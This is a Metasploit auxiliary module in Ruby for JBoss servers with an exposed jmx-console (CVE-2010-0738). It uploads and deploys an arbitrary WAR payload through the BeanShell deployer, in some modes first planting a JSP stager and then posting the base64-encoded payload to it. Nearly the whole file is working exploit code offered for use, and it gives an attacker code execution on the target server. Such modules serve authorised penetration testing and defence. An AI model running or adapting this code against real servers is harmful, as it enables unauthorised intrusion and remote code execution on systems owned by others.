##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::HTTP::JBoss

  def initialize
    super(
      'Name'            => 'JBoss JMX Console Beanshell Deployer WAR Upload and Deployment',
      'Description' => %q{
          This module can be used to install a WAR file payload on JBoss servers that have
        an exposed "jmx-console" application. The payload is put on the server by
        using the jboss.system:BSHDeployer\'s createScriptDeployment() method.
      },
      'Author'       =>
        [
          'us3r777 <us3r777[at]n0b0.so>'
        ],
      'License'     => BSD_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST
          [ 'OSVDB', '64171' ],
          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ],
        ],
      'Privileged'   => true,
      'Platform'     => %w{ java linux win },
      'Stance'       => Msf::Exploit::Stance::Aggressive,
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('APPBASE',    [ true,  'Application base name']),
        OptString.new('STAGERNAME', [ false, 'Only used if VERB is not POST (default: "stager")', 'stager']),
        OptString.new('WARFILE',    [ true,  'The WAR file to deploy']),
        OptString.new('PACKAGE',    [ true,  'The package containing the BSHDeployer service', 'auto' ]),
        OptBool.new('DEPLOY',       [ true,  'Deploy: true. Undeploy: false', true]),
      ], self.class)
  end

  def run
    app_base = datastore['APPBASE']
    stager_base = datastore['STAGERNAME'] || 'stager'
    stager_jsp_name = datastore['STAGERNAME'] || 'stager'

    uri = '/' + app_base + '/'
    if datastore['DEPLOY']
      # Read the WAR from the file given
      war_data = File.read(datastore['WARFILE'])  

      encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')

      if datastore['VERB'] == 'POST' then
        deploy_payload_bsh(encoded_payload, app_base)
      else
        content_var = Rex::Text.rand_text_alpha(8+rand(8))
        # We need to deploy a stager first
        deploy_stager_bsh(app_base, stager_base, stager_jsp_name, content_var)

        # now we call the stager to deploy our real payload war
        stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'
        payload_data = "#{content_var}=#{Rex::Text.uri_encode(encoded_payload)}"
        print_status("Calling stager to deploy final payload")
        call_uri_mtimes(stager_uri, 5, 'POST', payload_data)
      end

      tmp_verb = datastore['VERB']
      tmp_verb = 'GET' if tmp_verb == 'POST'
      call_uri_mtimes(uri, 5, tmp_verb)
    else
      # Undeploy the WAR and the stager if needed
      print_status("Undeploying #{uri} by deleting the WAR file via BSHDeployer...")
      if datastore['VERB'] == 'POST'
        delete_script = get_undeploy_bsh(app_base)
      else
        delete_script = get_undeploy_stager(app_base, stager_base, stager_jsp_name)
      end
      deploy_bsh(delete_script) 
    end
  end
end
